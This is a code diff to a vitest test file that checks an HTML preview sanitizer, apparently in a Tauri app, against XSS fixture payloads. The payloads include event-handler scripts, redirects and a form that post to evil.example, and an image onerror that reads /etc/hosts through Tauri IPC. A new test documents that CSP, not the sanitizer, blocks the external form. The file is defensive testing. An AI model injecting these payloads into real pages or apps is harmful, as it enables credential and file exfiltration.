@@ -38,7 +38,6 @@ const PAYLOADS: Record<string, string> = {
   detailsOntoggle: `<details open ontoggle="alert('x')"><summary>s</summary>b</details>`,
   metaRefresh: `<meta http-equiv="refresh" content="0; url=https://evil.example/">`,
   baseTag: `<base href="https://evil.example/">`,
-  formExternal: `<form action="https://evil.example/steal"><input name="s" value="x"></form>`,
   objectJs: `<object data="javascript:alert('x')"></object>`,
   embedJs: `<embed src="javascript:alert('x')">`,
   ipcExfil: `<img src="y" onerror="window.__TAURI_INTERNALS__.invoke('read_file',{path:'/etc/hosts'})">`,
@@ -53,6 +52,21 @@ describe('XSS fixture payloads are neutralized by the preview pipeline', () => {
       }
     });
   }
+
+  // <form action="https://..."> is NOT stripped by sanitizeUserHtml — DOMPurify
+  // keeps benign-looking action URLs. The defense against phishing-style
+  // credential exfiltration is CSP `form-action 'none'` (tauri.conf.json),
+  // which vitest cannot exercise. This test pins the pass-through so nobody
+  // mistakes the sanitizer for the defense layer here; if it starts failing,
+  // sanitization gained form handling and this comment (and the CSP note in
+  // KNOWLEDGE.md) should be revisited.
+  it('documents: external form action passes sanitize; CSP form-action blocks it', () => {
+    const out = render(
+      `<form action="https://evil.example/steal"><input name="s" value="x"></form>`,
+    );
+    expect(out).toContain('<form');
+    expect(out).toContain('action="https://evil.example/steal"');
+  });
 
   it('preserves legitimate content (defense did not over-strip)', () => {
     const out = render('**bold** and [link](https://example.com) and `code`');
